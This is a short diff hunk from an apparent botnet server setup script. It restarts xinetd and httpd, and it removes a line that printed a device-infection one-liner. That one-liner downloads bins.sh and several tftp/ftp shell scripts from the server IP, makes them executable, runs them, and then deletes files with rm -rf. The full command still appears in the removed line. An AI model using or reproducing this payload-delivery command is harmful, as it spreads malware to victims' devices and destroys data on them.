@@ -152,5 +152,3 @@ for i in compileas:
 run("service xinetd restart")
 run("service httpd restart")
 run('echo -e "ulimit -n 99999" >> ~/.bashrc')
-
-print("\x1b[0;32mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
